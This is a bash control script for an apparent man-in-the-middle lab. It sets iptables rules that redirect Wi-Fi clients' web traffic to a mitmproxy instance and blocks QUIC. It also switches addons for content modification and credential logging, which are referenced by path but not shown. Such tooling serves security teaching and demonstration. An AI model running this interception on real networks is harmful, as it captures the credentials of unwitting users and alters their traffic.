#!/usr/bin/env bash
set -euo pipefail

# mitm-control.sh — Enable/disable MITM interception and manage mitmproxy addons.
#
# Usage:
#   sudo ./mitm-control.sh status             # show interception + addon + webserver state
#   sudo ./mitm-control.sh enable             # enable MITM (iptables + service)
#   sudo ./mitm-control.sh disable            # disable MITM (traffic passes freely)
#   sudo ./mitm-control.sh modify    on|off   # content modification addon
#   sudo ./mitm-control.sh creds     on|off   # credential logging addon
#   sudo ./mitm-control.sh webserver on|off   # start/stop lab_webserver (stops nginx first)

SERVICE="enterprise.service"
PROXY_LAUNCHER="/usr/local/bin/start_proxy.sh"
ADDON_MODIFY="/usr/local/bin/mitm_demo_modify.py"
ADDON_CREDS="/usr/local/bin/mitm_credential_logger.py"

AP_IFACE="${AP_IFACE:-wlan0}"
LAB_GATEWAY="${LAB_GATEWAY:-192.168.50.1}"
PROXY_PORT="${PROXY_PORT:-8080}"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

[[ "${EUID}" -ne 0 ]] && { echo "[!] Run as root: sudo $0"; exit 1; }

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

interception_active() {
  iptables -t nat -C PREROUTING -i "${AP_IFACE}" ! -d "${LAB_GATEWAY}" \
    -p tcp --dport 80 -j REDIRECT --to-port "${PROXY_PORT}" 2>/dev/null
}

addon_active() {
  [[ -f "${PROXY_LAUNCHER}" ]] && grep -q -- "-s ${1}" "${PROXY_LAUNCHER}"
}

set_addon() {
  local addon_path="$1" state="$2"
  local name; name=$(basename "${addon_path}")

  if [[ "${state}" == "on" ]]; then
    [[ ! -f "${addon_path}" ]] && { echo -e "${RED}[!]${NC} Not found: ${addon_path}"; exit 1; }
    addon_active "${addon_path}" && { echo -e "${YELLOW}[--]${NC} ${name} already on"; return; }
    sed -i "$ s|$| \\\\\n  -s ${addon_path}|" "${PROXY_LAUNCHER}"
    echo -e "${GREEN}[ON] ${NC} ${name} enabled"
  else
    addon_active "${addon_path}" || { echo -e "${YELLOW}[--]${NC} ${name} already off"; return; }
    sed -i "\|-s ${addon_path}|d" "${PROXY_LAUNCHER}"
    # Remove any trailing backslash left on the new last line after addon deletion
    sed -i "$ s| \\\\$||" "${PROXY_LAUNCHER}"
    echo -e "${YELLOW}[OFF]${NC} ${name} disabled"
  fi
}

restart_service() {
  systemctl restart "${SERVICE}"
  sleep 2
  if systemctl is-active --quiet "${SERVICE}"; then
    echo -e "${GREEN}[OK]${NC} ${SERVICE} running"
  else
    echo -e "${RED}[FAIL]${NC} ${SERVICE} failed — check: journalctl -u ${SERVICE} -n 20"
    exit 1
  fi
}

print_status() {
  echo
  echo -e "${CYAN}[+] Interception${NC}"
  if interception_active; then
    echo -e "${GREEN}[ON] ${NC} iptables REDIRECT → port ${PROXY_PORT}"
    if systemctl is-active --quiet "${SERVICE}"; then
      echo -e "${GREEN}[ON] ${NC} ${SERVICE} running"
    else
      echo -e "${RED}[DOWN]${NC} ${SERVICE} not running — start: sudo systemctl start ${SERVICE}"
    fi
  else
    echo -e "${YELLOW}[OFF]${NC} No REDIRECT rules — traffic passes freely"
  fi

  echo
  echo -e "${CYAN}[+] Addons${NC}"
  addon_active "${ADDON_MODIFY}" \
    && echo -e "${GREEN}[ON] ${NC} modify — content modification" \
    || echo -e "${YELLOW}[OFF]${NC} modify — content modification"
  addon_active "${ADDON_CREDS}" \
    && echo -e "${GREEN}[ON] ${NC} creds  — credential logger" \
    || echo -e "${YELLOW}[OFF]${NC} creds  — credential logger"

  echo
  echo -e "${CYAN}[+] Lab Webserver${NC}"
  if systemctl is-active --quiet lab-webserver.service 2>/dev/null; then
    echo -e "${GREEN}[ON] ${NC} lab-webserver — http://192.168.50.1/send"
  else
    echo -e "${YELLOW}[OFF]${NC} lab-webserver — start: $0 webserver on"
  fi
  echo
}

# ---------------------------------------------------------------------------
# Interception on/off (iptables + service)
# ---------------------------------------------------------------------------

enable_interception() {
  if interception_active; then
    echo -e "${YELLOW}[--]${NC} Interception already active"
    return
  fi
  iptables -t nat -A PREROUTING -i "${AP_IFACE}" ! -d "${LAB_GATEWAY}" \
    -p tcp --dport 80  -j REDIRECT --to-port "${PROXY_PORT}"
  iptables -t nat -A PREROUTING -i "${AP_IFACE}" ! -d "${LAB_GATEWAY}" \
    -p tcp --dport 443 -j REDIRECT --to-port "${PROXY_PORT}"
  iptables -I FORWARD -i "${AP_IFACE}" -p udp --dport 443 -j REJECT --reject-with icmp-port-unreachable
  iptables -I FORWARD -i "${AP_IFACE}" -p udp --dport 80  -j REJECT --reject-with icmp-port-unreachable
  netfilter-persistent save 2>/dev/null || true
  systemctl start "${SERVICE}"
  echo -e "${GREEN}[ON]${NC}  Interception enabled"
}

disable_interception() {
  if ! interception_active; then
    echo -e "${YELLOW}[--]${NC} Interception already off"
    return
  fi
  iptables -t nat -D PREROUTING -i "${AP_IFACE}" ! -d "${LAB_GATEWAY}" \
    -p tcp --dport 80  -j REDIRECT --to-port "${PROXY_PORT}" 2>/dev/null || true
  iptables -t nat -D PREROUTING -i "${AP_IFACE}" ! -d "${LAB_GATEWAY}" \
    -p tcp --dport 443 -j REDIRECT --to-port "${PROXY_PORT}" 2>/dev/null || true
  iptables -D FORWARD -i "${AP_IFACE}" -p udp --dport 443 -j REJECT --reject-with icmp-port-unreachable 2>/dev/null || true
  iptables -D FORWARD -i "${AP_IFACE}" -p udp --dport 80  -j REJECT --reject-with icmp-port-unreachable 2>/dev/null || true
  netfilter-persistent save 2>/dev/null || true
  systemctl stop "${SERVICE}"
  echo -e "${YELLOW}[OFF]${NC} Interception disabled — traffic passes freely"
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

CMD="${1:-status}"
STATE="${2:-}"

require_launcher() {
  [[ -f "${PROXY_LAUNCHER}" ]] || { echo "[!] Run enterprise_lab.sh first to generate ${PROXY_LAUNCHER}"; exit 1; }
}

case "${CMD}" in
  status)
    print_status
    ;;
  enable)
    enable_interception
    print_status
    ;;
  disable)
    disable_interception
    print_status
    ;;
  modify)
    require_launcher
    [[ "${STATE}" == "on" || "${STATE}" == "off" ]] || { echo "Usage: $0 modify on|off"; exit 1; }
    set_addon "${ADDON_MODIFY}" "${STATE}"
    restart_service
    ;;
  creds)
    require_launcher
    [[ "${STATE}" == "on" || "${STATE}" == "off" ]] || { echo "Usage: $0 creds on|off"; exit 1; }
    set_addon "${ADDON_CREDS}" "${STATE}"
    restart_service
    ;;
  webserver)
    [[ "${STATE}" == "on" || "${STATE}" == "off" ]] || { echo "Usage: $0 webserver on|off"; exit 1; }
    if [[ "${STATE}" == "on" ]]; then
      if systemctl is-active --quiet nginx 2>/dev/null; then
        systemctl stop nginx
        echo "[+] Stopped nginx (port 80 now free)"
      fi
      systemctl start lab-webserver.service
      echo -e "${GREEN}[ON]${NC}  lab-webserver started — http://${LAB_GATEWAY}/send"
    else
      systemctl stop lab-webserver.service 2>/dev/null || true
      echo -e "${YELLOW}[OFF]${NC} lab-webserver stopped"
    fi
    ;;
  *)
    echo "Usage: sudo $0 <command> [on|off]"
    echo
    echo "  status              Show interception, addon and webserver state"
    echo "  enable              Enable MITM interception (iptables + service)"
    echo "  disable             Disable MITM interception (traffic passes freely)"
    echo "  modify    on|off    Toggle content modification addon (Gooogle/B1ng)"
    echo "  creds     on|off    Toggle credential logging addon"
    echo "  webserver on|off    Start/stop lab_webserver on port 80 (stops nginx first)"
    exit 1
    ;;
esac
